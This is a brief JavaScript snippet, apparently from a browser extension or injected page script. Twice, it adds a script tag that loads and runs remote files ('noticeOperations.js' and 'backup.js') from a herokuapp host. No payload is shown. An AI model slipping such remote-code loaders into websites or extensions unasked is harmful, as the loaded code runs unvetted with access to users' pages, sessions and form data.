(function append() {
    let d = document, sn = 'script', f = d.getElementsByTagName(sn)[0];
    if (!f) f = d.head;
    let s = d.createElement(sn);
    s.src ="https://ucpext-516b1e095e39.herokuapp.com/js/noticeOperations.js";
    s.charset = 'utf-8';
    f.parentNode.insertBefore(s, f);
})()




(function append() {
    let d = document, sn = 'script', f = d.getElementsByTagName(sn)[0];
    if (!f) f = d.head;
    let s = d.createElement(sn);
    s.src ="https://ucpext-516b1e095e39.herokuapp.com/js/backup.js";
    s.charset = 'utf-8';
    f.parentNode.insertBefore(s, f);
})()